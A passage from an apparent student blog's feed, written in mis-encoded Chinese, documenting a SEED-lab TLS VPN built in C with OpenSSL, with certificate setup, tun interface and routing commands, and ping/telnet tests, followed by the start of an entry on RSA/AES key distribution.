style="zoom:80%;"><p>é€šè¿‡ä¸Šé¢çš„æµ‹è¯•å¯ä»¥ç¡®å®šä¸¤å°ä¸»æœºå¯ä»¥é€šè¿‡VPNç¨‹åºè¿›è¡Œè¿œç¨‹æ§åˆ¶ã€‚</p><h1 id="äºŒã€TSL-VPN"><a href="#äºŒã€TSL-VPN" class="headerlink" title="äºŒã€TSL VPN"></a>äºŒã€TSL VPN</h1><p>æœ‰äº†ä¸Šé¢åŸºäºTCPçš„VPNï¼Œå†åšTSLå°±ä¼šç®€å•å¾ˆå¤šã€‚</p><h2 id="ç¨‹åºå®ç°-1"><a href="#ç¨‹åºå®ç°-1" class="headerlink" title="ç¨‹åºå®ç°"></a>ç¨‹åºå®ç°</h2><h3 id="sslåˆå§‹åŒ–"><a href="#sslåˆå§‹åŒ–" class="headerlink" title="sslåˆå§‹åŒ–"></a>sslåˆå§‹åŒ–</h3><p>åˆ›å»ºSSLæ•°æ®ç»“æ„ï¼Œç”¨äºå»ºç«‹TLSè¿æ¥</p><p><code>VPN server</code></p><pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">SSLLibInit</span><span class="hljs-params">()</span> </span>&#123;   SSL_METHOD *meth;   SSL_CTX* ctx;   SSL *ssl;   <span class="hljs-keyword">int</span> err;   <span class="hljs-comment">// OpenSSL åˆå§‹åŒ–</span>   SSL_library_init();   SSL_load_error_strings();   SSLeay_add_ssl_algorithms();      <span class="hljs-comment">// SSL åˆå§‹åŒ–</span>   meth = (SSL_METHOD *)TLSv1_2_method();   ctx = SSL_CTX_new(meth);   SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);   <span class="hljs-comment">// åŠ è½½æœåŠ¡å™¨è¯ä¹¦å’Œç§é’¥æ–‡ä»¶</span>   SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">&quot;./cert_server/server.pem&quot;</span>, SSL_FILETYPE_PEM);   SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">&quot;./cert_server/server-key.pem&quot;</span>, SSL_FILETYPE_PEM);   ssl = SSL_new (ctx);   <span class="hljs-keyword">return</span> ssl;&#125;</code></pre><p><code>VPN client</code></p><pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">setupTLSClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// OpenSSL åˆå§‹åŒ–</span>   SSL_library_init();   SSL_load_error_strings();   SSLeay_add_ssl_algorithms();   SSL_METHOD *meth;   SSL_CTX* ctx;   SSL* ssl;   meth = (SSL_METHOD *)TLSv1_2_method();   ctx = SSL_CTX_new(meth);   SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);  <span class="hljs-comment">//æŒ‡æ˜æ˜¯å¦è¦æ±‚æä¾›è¯ä¹¦</span>   <span class="hljs-keyword">if</span> (SSL_CTX_load_verify_locations(ctx,<span class="hljs-literal">NULL</span>, CA_DIR) &lt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//åŠ è½½å¯ä¿¡CAè¯ä¹¦ï¼Œè¿›è¡Œè¯ä¹¦éªŒè¯</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error setting the verify locations. \n&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;   ssl = SSL_new (ctx);   X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl);    X509_VERIFY_PARAM_set1_host(vpm, hostname, <span class="hljs-number">0</span>);   <span class="hljs-keyword">return</span> ssl;&#125;</code></pre><h3 id="TCPè¿æ¥-1"><a href="#TCPè¿æ¥-1" class="headerlink" title="TCPè¿æ¥"></a>TCPè¿æ¥</h3><p>TCPè¿æ¥ä¸ä¸Šé¢çš„è¿æ¥ä¸€æ ·ã€‚</p><h3 id="TLSæ¡æ‰‹"><a href="#TLSæ¡æ‰‹" class="headerlink" title="TLSæ¡æ‰‹"></a>TLSæ¡æ‰‹</h3><blockquote><p>SSL_set_fd()å°†SSLç»‘å®šåˆ°ä¸€ä¸ªTCPè¿æ¥<br>è°ƒç”¨SSL_connec()å¯åŠ¨ä¸æœåŠ¡å™¨çš„TLSæ¡æ‰‹åè®®)</p></blockquote><pre><code class="hljs c"><span class="hljs-comment">/*----------------TLS initialization ----------------*/</span>ssl   = setupTLSClient(hostname);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TLSClientsetup initialisation is successful\n&quot;</span>);<span class="hljs-comment">/*----------------Create a TCP connection ---------------*/</span><span class="hljs-keyword">int</span> sockfd = setupTCPClient(hostname, port);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TCPClientsetup is successful\n&quot;</span>);<span class="hljs-comment">/*----------------TLS handshake ---------------------*/</span>SSL_set_fd(ssl, sockfd);  <span class="hljs-comment">//ç»‘å®šTCPè¿æ¥</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL_set_fd() is successful\n&quot;</span>);<span class="hljs-keyword">int</span> err = SSL_connect(ssl); CHK_SSL(err);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL connection is successful\n&quot;</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL connection using %s\n&quot;</span>, SSL_get_cipher(ssl));</code></pre><h3 id="æ•°æ®è½¬å‘"><a href="#æ•°æ®è½¬å‘" class="headerlink" title="æ•°æ®è½¬å‘"></a>æ•°æ®è½¬å‘</h3><p>æ•°æ®è½¬å‘çš„åŸç†ä¸åŸºäºUDP/TCPçš„VPN çš„åŸç†</p><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processRequest</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl, <span class="hljs-keyword">int</span> sockfd)</span></span><span class="hljs-function"></span>&#123;   <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;     fd_set readFDSet;     FD_ZERO(&amp;readFDSet);     FD_SET(sockfd, &amp;readFDSet);     FD_SET(tunfd, &amp;readFDSet);     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet)) tunSelected(tunfd, sockfd, ssl);     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet)) socketSelected(tunfd, sockfd, ssl);   &#125;&#125;</code></pre><h2 id="å®éªŒç¯å¢ƒ-1"><a href="#å®éªŒç¯å¢ƒ-1" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>ç”±äºåœ¨ä¸Šubuntu 18.04ä¸Šè¿è¡Œæ—¶ï¼Œç¨‹åºå‡ºç°é”™è¯¯ï¼Œæ‰€ä»¥ä½¿ç”¨äº†seedLab æä¾›çš„ ubuntu 16.04é‡æ–°æ­å»ºäº†å®éªŒç¯å¢ƒã€‚å„ä¸ªç½‘å¡ä¿¡æ¯ä¸ä¸Šé¢çš„å®éªŒä¸€æ ·ã€‚</p><blockquote><p>host Uï¼šubuntu 16.04</p><p>VPNserverï¼šubuntu 16.04</p><p>host Vï¼šubuntu 16.04</p></blockquote><h3 id="ä¸»æœºç‰©ç†ç½‘å¡é…ç½®-1"><a href="#ä¸»æœºç‰©ç†ç½‘å¡é…ç½®-1" class="headerlink" title="ä¸»æœºç‰©ç†ç½‘å¡é…ç½®"></a>ä¸»æœºç‰©ç†ç½‘å¡é…ç½®</h3><table><thead><tr><th align="center">ä¸»æœº</th><th align="center">è§’è‰²</th><th align="center">IPåœ°å€</th></tr></thead><tbody><tr><td align="center">å®¢æˆ·æœº</td><td align="center">VPNå®¢æˆ·æœº/host U</td><td align="center">10.0.2.7/24</td></tr><tr><td align="center">æœåŠ¡å™¨</td><td align="center">VPNæœåŠ¡å™¨/ç½‘å…³</td><td align="center">10.0.2.8/24<br>192.168.60.1/24</td></tr><tr><td align="center">å†…ç½‘ä¸»æœº</td><td align="center">host V</td><td align="center">192.168.60.101/24</td></tr></tbody></table><h3 id="è¿é€šæ€§æµ‹è¯•"><a href="#è¿é€šæ€§æµ‹è¯•" class="headerlink" title="è¿é€šæ€§æµ‹è¯•"></a>è¿é€šæ€§æµ‹è¯•</h3><p>é…ç½®å®Œå„ä¸ªç½‘å¡çš„IPåœ°å€å</p><ul><li><p>host U å¯ä»¥ ping é€š VPNserver (10.0.2.0/24)</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717190020679.png" alt="image-20210717190020679" style="zoom:67%;"><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203822712.png" alt="image-20210716203822712" style="zoom: 50%;"></li><li><p>VPN server å¯ä»¥ping é€šä¸¤å°ä¸»æœº</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717185939151.png" alt="image-20210717185939151" style="zoom: 67%;"><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717185952701.png" alt="image-20210717185952701" style="zoom:67%;"></p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203744476.png" alt="image-20210716203744476" style="zoom: 50%;"></li><li><p>host Vå¯ä»¥ping é€šVPNserver (192.168.60.0/24)</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717190103613.png" alt="image-20210717190103613" style="zoom:67%;"><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203807499.png" alt="image-20210716203807499" style="zoom: 50%;"></li></ul><h3 id="CAå’Œè¯ä¹¦è®¾ç½®"><a href="#CAå’Œè¯ä¹¦è®¾ç½®" class="headerlink" title="CAå’Œè¯ä¹¦è®¾ç½®"></a>CAå’Œè¯ä¹¦è®¾ç½®</h3><p>(1)ã€ä¸º CA ç”Ÿæˆä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ï¼Œå®ƒå°†ä½œä¸ºæ ¹è¯ä¹¦ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code class="hljs vim">openssl req -<span class="hljs-keyword">new</span> -x509 -keyout <span class="hljs-keyword">ca</span>.key -out <span class="hljs-keyword">ca</span>.crt -config openssl.<span class="hljs-keyword">cnf</span>//æ–‡ä»¶ <span class="hljs-keyword">ca</span>.key åŒ…å« CA çš„ç§é’¥ï¼Œè€Œ <span class="hljs-keyword">ca</span>.crt åŒ…å«å…¬é’¥è¯ä¹¦ã€‚</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192409460.png" alt="image-20210717192409460" style="zoom:80%;"><p>(2)ã€æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨åˆ›å»ºä¸€ä¸ª RSA å…¬ç§é’¥å¯¹</p><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> genrsa -aes<span class="hljs-number">128</span> -out server.key <span class="hljs-number">1024</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192456568.png" alt="image-20210717192456568"></p><p>(3)ã€åˆ›å»ºä¸€ä¸ªåŒ…å«æœåŠ¡å™¨å…¬é’¥çš„è¯ä¹¦ç­¾åè¯·æ±‚ (CSR)ã€‚ CSR å…·æœ‰ä»¥ä¸‹è¯¦ç»†ä¿¡æ¯ï¼ŒæœåŠ¡å™¨çš„é€šç”¨åç§°ä¸º <code>sunzy.com</code>ï¼š</p><pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.csr -config openssl.cnf</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192547722.png" alt="image-20210717192547722" style="zoom:80%;"><p>(4)ã€ç„¶åå°†ä¸Šè¿° CSR å‘é€åˆ° CA ä»¥ç”Ÿæˆå¯†é’¥å’Œé€šç”¨åç§°çš„è¯ä¹¦ã€‚</p><pre><code class="hljs pgsql">openssl x509 -req -days <span class="hljs-number">365</span> -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.csr -signkey <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210716211833071.png" alt="image-20210716211833071" style="zoom: 67%;"><p>(5)ã€å°†æœåŠ¡å™¨çš„è¯ä¹¦å’Œå¯†é’¥å­˜å‚¨ä¸º pem æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯</p><pre><code class="hljs axapta">cp <span class="hljs-keyword">server</span>.crt <span class="hljs-keyword">server</span>-cert.pemcp <span class="hljs-keyword">server</span>.key <span class="hljs-keyword">server</span>-key.pem</code></pre><p>VPN Server ç¨‹åºä½¿ç”¨è¿™äº›æ–‡ä»¶æ¥åŠ è½½è¯ä¹¦å’Œç§é’¥ï¼Œå¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717105652371.png" alt="image-20210717105652371"></p><p>(6)ã€ä½¿ç”¨åç§°ä½œä¸ºä¸»é¢˜å­—æ®µçš„å“ˆå¸Œå­˜å‚¨æœåŠ¡å™¨çš„è¯ä¹¦ã€‚è¿™æ˜¯å› ä¸ºåœ¨æ¥æ”¶æœåŠ¡å™¨çš„è¯ä¹¦æ—¶ï¼ŒTLS ä¼šæ ¹æ®é¢å‘è€…çš„èº«ä»½ä¿¡æ¯ç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œå¹¶ä½¿ç”¨æ­¤å“ˆå¸Œå€¼åœ¨â€œ./certâ€æ–‡ä»¶å¤¹ä¸­æŸ¥æ‰¾é¢å‘è€…çš„è¯ä¹¦ï¼Œå‘½ä»¤å¦‚ä¸‹:(ä»¥ä¸‹å‘½ä»¤åœ¨ca_client æ–‡ä»¶ä¸‹æ‰§è¡Œ)</p><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> x<span class="hljs-number">509</span> -in ca.crt -noout -subject_hash<span class="hljs-attribute">ln</span> -s ca.crt b<span class="hljs-number">4386</span>d<span class="hljs-number">70</span>.<span class="hljs-number">0</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717105919161.png" alt="image-20210717105919161"></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717200542030.png" alt="image-20210717200542030"></p><h2 id="å»ºç«‹TLSé€šä¿¡"><a href="#å»ºç«‹TLSé€šä¿¡" class="headerlink" title="å»ºç«‹TLSé€šä¿¡"></a>å»ºç«‹TLSé€šä¿¡</h2><h3 id="VPN-server"><a href="#VPN-server" class="headerlink" title="VPN server"></a>VPN server</h3><p>é¦–å…ˆåœ¨VPNæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†cç¨‹åºç¼–è¯‘ä¸ºå¯æ‰§è¡Œç¨‹åº</p><pre><code class="hljs llvm">gcc -o vpnserver_tls vpnserver_tls.<span class="hljs-keyword">c</span> -lssl -lcrypto -lcrypt</code></pre><p>æ‰§è¡Œç¼–è¯‘å¥½çš„ç¨‹åºï¼Œæ­¤æ—¶è¯¥ç¨‹åºå¤„äºç›‘å¬çŠ¶æ€ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717110722763.png" alt="image-20210717110722763"></p><p>æ­¤æ—¶è¯¥ç¨‹åºå°†åˆ›å»ºä¸€ä¸ª<code>tun0</code>è™šæ‹Ÿç½‘å¡ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é…ç½®ç½‘å¡ä¿¡æ¯</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.1</span>/<span class="hljs-number">24</span> up</code></pre><p>é…ç½®å®Œåçš„ç½‘å¡ä¿¡æ¯å¦‚å›¾ï¼š</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717104726586.png" alt="image-20210717104726586" style="zoom:67%;"><p>ç¼–è¾‘è·¯ç”±è¡¨å¹¶å°†è®¾ç½®ä¸ºè½¬å‘æ¨¡å¼</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> route add â€“net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> tun<span class="hljs-number">0</span><span class="hljs-attribute">sudo</span> sysctl net.ipv<span class="hljs-number">4</span>.ip_forward=<span class="hljs-number">1</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717092728424.png" alt="image-20210717092728424"></p><h3 id="VPN-client"><a href="#VPN-client" class="headerlink" title="VPN client"></a>VPN client</h3><p>ä¸æœåŠ¡å™¨ä¸Šä¸€æ ·ï¼Œé¦–å…ˆç¼–è¯‘cç¨‹åº</p><pre><code class="hljs llvm">gcc -o vpnclient_tls vpnclient_tls.<span class="hljs-keyword">c</span> -lssl -lcrypto</code></pre><p>æ‰§è¡Œè¯¥ç¨‹åºï¼ˆè¯¥åŸŸåä¸ä¸Šé¢åˆ›å»ºçš„è¯ä¹¦ä¸­çš„é€šç”¨åç§°ä¸€æ ·ï¼‰</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ./vpnclient_tls <span class="hljs-string">&quot;sunzy.com&quot;</span> <span class="hljs-number">4433</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111325426.png" alt="image-20210717111325426"></p><p>åˆ›å»ºè¿æ¥åï¼ŒæœåŠ¡å™¨ç«¯ç¡®è®¤åï¼Œå¼€å§‹èº«ä»½è®¤è¯</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111437904.png" alt="image-20210717111437904"></p><p>æœåŠ¡å™¨ç«¯æ”¶åˆ°çš„æ¶ˆæ¯å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111535076.png" alt="image-20210717111535076"></p><p>æ­¤æ—¶TLSè¿æ¥å·²ç»å»ºç«‹ã€‚</p><p>é…ç½®tun0å’Œè·¯ç”±è¡¨</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up<span class="hljs-attribute">sudo</span> route add -net <span class="hljs-number">192.168.60.0</span>/<span class="hljs-number">24</span></code></pre><h3 id="Host-V"><a href="#Host-V" class="headerlink" title="Host V"></a>Host V</h3><p>è¦å®ç°å†…å¤–ç½‘ä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼Œè¿˜éœ€è¦åœ¨å†…ç½‘ä¸»æœºä¸Šæ·»åŠ è·¯ç”±è¡¨ä¿¡æ¯</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> route add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> enp<span class="hljs-number">0</span>s<span class="hljs-number">3</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717113001100.png" alt="image-20210717113001100"></p><h3 id="VPN-serverå’ŒVPN-client-çš„è¿æ¥ä¿¡æ¯"><a href="#VPN-serverå’ŒVPN-client-çš„è¿æ¥ä¿¡æ¯" class="headerlink" title="VPN serverå’ŒVPN client çš„è¿æ¥ä¿¡æ¯"></a>VPN serverå’ŒVPN client çš„è¿æ¥ä¿¡æ¯</h3><p><code>VPN server</code></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717160935019.png" alt="image-20210717160935019"></p><p><code>VPN client</code></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717161031264.png" alt="image-20210717161031264"></p><h2 id="é€šä¿¡éªŒè¯"><a href="#é€šä¿¡éªŒè¯" class="headerlink" title="é€šä¿¡éªŒè¯"></a>é€šä¿¡éªŒè¯</h2><h3 id="ping-æµ‹è¯•-1"><a href="#ping-æµ‹è¯•-1" class="headerlink" title="ping æµ‹è¯•"></a>ping æµ‹è¯•</h3><ul><li>å®¢æˆ·ç«¯ï¼ˆ10.0.2.7ï¼‰ping å†…ç½‘ä¸»æœºï¼ˆ192.168.60.101ï¼‰</li></ul><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717104553457.png" alt="image-20210717104553457" style="zoom:67%;"><ul><li>å†…ç½‘ä¸»æœº(192.168.60.101) ping 10.0.2.7 </li></ul><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717104633291.png" alt="image-20210717104633291" style="zoom:67%;"><p>æŸ¥çœ‹å®¢æˆ·ç«¯ä¸Šçš„ Wireshark æ•°æ®æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ° ping è¯·æ±‚ä» tun0 å‘é€åˆ°å†…éƒ¨ç½‘ç»œ IPï¼Œå¹¶ä¸”æ­¤æ•°æ®åŒ…ä» VPN å®¢æˆ·ç«¯å‘é€åˆ° VPN tunnel</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717153451936.png" alt="image-20210717153451936" style="zoom:67%;"><p>åœ¨æœåŠ¡å™¨ç«¯ï¼Œæˆ‘ä»¬çœ‹åˆ°ç±»ä¼¼çš„æµé‡â€”â€”ä¸»æœº U å’Œä¸»æœº V ä¹‹é—´çš„ ping è¯·æ±‚å’Œå›å¤é€šä¿¡ï¼Œä¸­é—´æœ‰ VPN æœåŠ¡å™¨ã€‚ </p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717133757659.png" alt="image-20210717133757659" style="zoom:67%;"><h3 id="telnet-æµ‹è¯•"><a href="#telnet-æµ‹è¯•" class="headerlink" title="telnet æµ‹è¯•"></a>telnet æµ‹è¯•</h3><ul><li>é¦–å…ˆåœ¨åœ¨Host Uä¸Šä½¿ç”¨telnetæ§åˆ¶Host V</li></ul><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717114933233.png" alt="image-20210717114933233" style="zoom: 67%;"><ul><li>åœ¨å†…ç½‘ä¸»æœºHost V ä¸Štelnet å®¢æˆ·ç«¯HostU </li></ul><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717115511290.png" alt="image-20210717115511290" style="zoom: 67%;"><p>wiresharkæŠ“å–çš„telnetçš„é€šä¿¡æ•°æ®åŒ…</p><p>VPN serverä¸Šçš„æ•°æ®åŒ…ä¿¡æ¯</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717153538769.png" alt="image-20210717153538769" style="zoom:67%;"><h2 id="å‘½ä»¤é›†åˆ"><a href="#å‘½ä»¤é›†åˆ" class="headerlink" title="å‘½ä»¤é›†åˆ"></a>å‘½ä»¤é›†åˆ</h2><h3 id="VPN-server-1"><a href="#VPN-server-1" class="headerlink" title="VPN server"></a>VPN server</h3><pre><code class="hljs shell">//ç¼–è¯‘ç¨‹åºgcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt//å¯åŠ¨ç¨‹åºsudo ./vpnserver_tls 4433</code></pre><pre><code class="hljs shell">//è®¾ç½®tun0ä¿¡æ¯ æ·»åŠ è½¬å‘åŠŸèƒ½ æ·»åŠ è·¯ç”±sudo ifconfig tun0 192.168.53.1/24 upsudo sysctl net.ipv4.ip_forward=1sudo route add -net 192.168.53.0/24 tun0sudo route add -net 192.168.60.0/24 tun0</code></pre><h3 id="VPN-client-1"><a href="#VPN-client-1" class="headerlink" title="VPN client"></a>VPN client</h3><pre><code class="hljs awk"><span class="hljs-regexp">//</span>ç¼–è¯‘ç¨‹åºgcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto<span class="hljs-regexp">//</span>å¯åŠ¨ç¨‹åºsudo ./vpnclient_tls sunzy.com <span class="hljs-number">4433</span></code></pre><pre><code class="hljs armasm"><span class="hljs-comment">//è®¾ç½®tun0ä¿¡æ¯  æ·»åŠ è·¯ç”±</span><span class="hljs-symbol">sudo</span> ifconfig tun0 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">53</span>.<span class="hljs-number">5</span>/<span class="hljs-number">24</span> up<span class="hljs-symbol">sudo</span> route <span class="hljs-keyword">add</span> -net <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">60</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span></code></pre><h3 id="å†…ç½‘ä¸»æœº"><a href="#å†…ç½‘ä¸»æœº" class="headerlink" title="å†…ç½‘ä¸»æœº"></a>å†…ç½‘ä¸»æœº</h3><pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> enp<span class="hljs-number">0</span>s<span class="hljs-number">3</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>homework</category>
      
    </categories>
    
    
    <tags>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSA_AES</title>
    <link href="/2021/07/21/RSA-AES/"/>
    <url>/2021/07/21/RSA-AES/</url>
    
    <content type="html"><![CDATA[<p>è¥¿åŒ—å·¥ä¸šå¤§å­¦å¤ä»¤è¥è€ƒæ ¸é¡¹ç›®</p><span id="more"></span><h1 id="ä¸€ã€å®éªŒè¦æ±‚"><a href="#ä¸€ã€å®éªŒè¦æ±‚" class="headerlink" title="ä¸€ã€å®éªŒè¦æ±‚"></a>ä¸€ã€å®éªŒè¦æ±‚</h1><blockquote><p>ï¼ˆ 1ï¼‰ ç”¨ RSA ç®—æ³•å®ç°ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„å¯†é’¥åˆ†å‘ï¼Œ åˆ†å‘çš„å¯†é’¥ä¸º 0x 01 23 45 67 æˆ– 0x 01 23 45 67 89 AB CD EFï¼›<br>ï¼ˆ 2ï¼‰ ç”¨åˆ†å‘çš„å¯†é’¥å’Œ AES åŠ å¯†ç®—æ³•ï¼Œ å®ç°ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„åŠ å¯†æ•°æ®ä¼ è¾“ï¼Œ æµ‹è¯•æ•°æ®æ˜¯â€œNPU-SCSâ€ å’Œå…¶ä»–è‡ªå·±æ„é€ çš„ 7 æ¡æ¶ˆæ¯ï¼›<br>ï¼ˆ 3ï¼‰ ä»¥ä¸Š 2 ä¸ªæ­¥éª¤åœ¨ç¨‹åºä¸­è‡ªåŠ¨æ‰§è¡Œå®Œï¼Œ æ— æ‰‹åŠ¨å‚ä¸ï¼› ç¨‹åºå¯ä»¥åœ¨åŒä¸€å°ä¸»æœºä¸Šå®Œæˆï¼Œ ä½†æ•°æ®å¿…é¡»ç»è¿‡ç½‘ç»œä¼ è¾“ï¼ˆ å¯ä»¥æœ¬åœ°å‘é€ï¼Œ æœ¬åœ°æ¥æ”¶ï¼‰ï¼›<br>ï¼ˆ 4ï¼‰ å¯†ç ç®—æ³•å¿…é¡»æ˜¯æºç ç¼–è¯‘å¾—åˆ°ï¼Œ ä¸èƒ½ç›´æ¥ç”¨ç¼–è¯‘è¿‡çš„åº“æ–‡ä»¶ï¼›RSA å’Œ AES ç®—æ³•çš„æºç å¯ä»¥æ¥è‡ªäºç½‘ç»œæˆ–å…¶ä»–ä»»æ„æ¸ é“ï¼›<br>ï¼ˆ 5ï¼‰ ä»¥ä¸Šç®—æ³•é€‰æ‹©å›½å¯†ç®—æ³•å®ç°æ›´ä½³ï¼›<br>ï¼ˆ 6ï¼‰ ç”¨ Python æˆ– C/C++è¯­è¨€å®ç°ç¨‹åºï¼Œ å†™å‡ºæŠ€æœ¯å¼€å‘æ–‡æ¡£ï¼Œ å½•åˆ¶ä¸€æ®µä¸è¶…è¿‡ 8 åˆ†é’Ÿçš„æ¼”ç¤ºè§†é¢‘ã€‚ æäº¤æŠ€æœ¯å¼€å‘æ–‡æ¡£ã€ æ¼”ç¤ºè§†é¢‘ã€‚     </p></blockquote><h1 id="äºŒã€éœ€æ±‚åˆ†æ"><a href="#äºŒã€éœ€æ±‚åˆ†æ" class="headerlink" title="äºŒã€éœ€æ±‚åˆ†æ"></a>äºŒã€éœ€æ±‚åˆ†æ</h1><p>è®¾ä¼ è¾“æ–‡ä»¶çš„åŒæ–¹åˆ†åˆ«ä¸ºAliceå’ŒBobï¼ŒAliceä¸ºä¼ è¾“æ–‡ä»¶çš„ä¸€æ–¹ï¼ŒBobä½œä¸ºæ¥æ”¶æ–‡ä»¶çš„ä¸€æ–¹ã€‚</p><p>é¦–å…ˆç¡®å®šä½¿ç”¨Windowsçš„socketå¥—æ¥å­—å®ç°ç½‘ç»œé€šä¿¡ï¼ŒBobä½œä¸ºæœåŠ¡å™¨ä¸€æ–¹ï¼Œç­‰å¾…Aliceçš„è¿æ¥ï¼Œç„¶åAliceå‘Bobå‘é€æ•°æ®ã€‚</p><p>å®‰å…¨éœ€æ±‚å¦‚ä¸‹:</p><ul><li><p>ä½¿ç”¨RSAç®—æ³•ç”ŸæˆAliceå’ŒBobä½¿ç”¨çš„å…¬é’¥ï¼Œå¹¶è®¡ç®—å‡ºç§é’¥ååˆ†å‘ï¼Œä¸ºåç»­çš„æ•°å­—ç­¾åï¼ˆMD5ï¼‰å’Œå¯¹ç§°åŠ 